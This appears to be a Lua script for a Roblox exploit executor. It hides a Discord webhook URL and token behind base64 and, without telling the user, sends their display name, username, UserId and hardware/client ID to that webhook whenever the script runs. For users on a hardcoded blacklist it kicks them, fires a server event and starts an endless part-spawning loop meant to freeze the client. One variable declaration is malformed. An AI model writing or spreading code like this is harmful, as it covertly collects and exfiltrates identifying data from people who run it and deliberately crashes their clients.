local HttpService = game:GetService("HttpService")

local whbase = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"
local whId = "MTMzMTM2NTY2MjA1MTkyNjEzOA=="
local wht = "TXh6XzI4VnppRl9DV1JRTm5zTklvOHdCbXZYYVJuOVR1dVVuWmR4aE92N0hSVWZWMVBIWk5BTWZOZjhwNWxEbTcyQ3E="

local Webhook_ URL= HttpService:Base64Decode(whbase) .. HttpService:Base64Decode(whId) .. "/" .. HttpService:Base64Decode(wht)

local ls = game:GetService("LocalizationService")
local S_hwid = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
local plre = game.Players.LocalPlayer
local plr = game.Players.LocalPlayer
local DName = plre.DisplayName
local UName = plre.Name
local WV = "false"
local status = "nil"
local Countries = {}

local maks = "maksimmilana22"

local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")

local ME = ReplicatedStorage.Events.ME

function IsInDungeon()
    return game.ReplicatedStorage.Dungeon.Value
end

function IsInPvp()
    if plr:FindFirstChild("PvPed") then
        return true
    else
        return false
    end
end

local blacklisted = {"b997b340-4056-40ce-bae7-95ce083d6465", 140378057}

if table.find(blacklisted, S_hwid) or table.find(blacklisted, plr.UserId) then
  WV = "Blacklisted"
else
  WV = "Not blacklisted"
end

local embedcolor

if WV == "Not blacklisted" then
  embedcolor = 4388219 -- Corresponding integer for hex #42A86B
else
  embedcolor = 14887209 -- Corresponding integer for hex #E31319
end

if WV == "Not blacklisted" and IsInPvp() then
  status = "In Pvp"
  embedcolor = 16562691 -- Corresponding integer for hex #FC7463
elseif WV == "Not blacklisted" and not IsInDungeon() and not IsInPvp() then
  status = "In overworld"
  embedcolor = 5827380 -- Corresponding integer for hex #58B1A4
elseif WV == "Not blacklisted" and IsInDungeon() then
  embedcolor = 4360181 -- Corresponding integer for hex #429995
  status = "In dungeon"
elseif WV == "Blacklisted" then
  status = "Blacklisted"
end

if not S_hwid then
    S_hwid = "Unknown"
end
local response =
    request(
    {
        Url = Webhook_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(
            {
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["title"] = "Script has been executed.",
                        ["description"] = DName.. " (" ..UName.. ") has executed a script. \n \n **Status** \n "..status,
                        ["type"] = "rich",
                        ["color"] = embedcolor,
                        ["fields"] = {
                           {
                       ["name"] = "Information",
                       ["value"] = "UserId: "..tostring(plr.UserId)
                           },
                           {
                        ["name"] = "Hardware Id",
                        ["value"] = S_hwid,
                        ["inline"] = true
                           }
                        }
                    }
                }
            }
        )
    }
)

local SoundEvent = {
        [1] = "repsound",
        [2] = "Teleport"
    }

if WV == "Blacklisted" then
  plr:Kick("ough ,,. yagami...") ME:FireServer(SoundEvent) while true do local part = Instance.new("Part", workspace) part.Name = "FUCKYOU" end
end
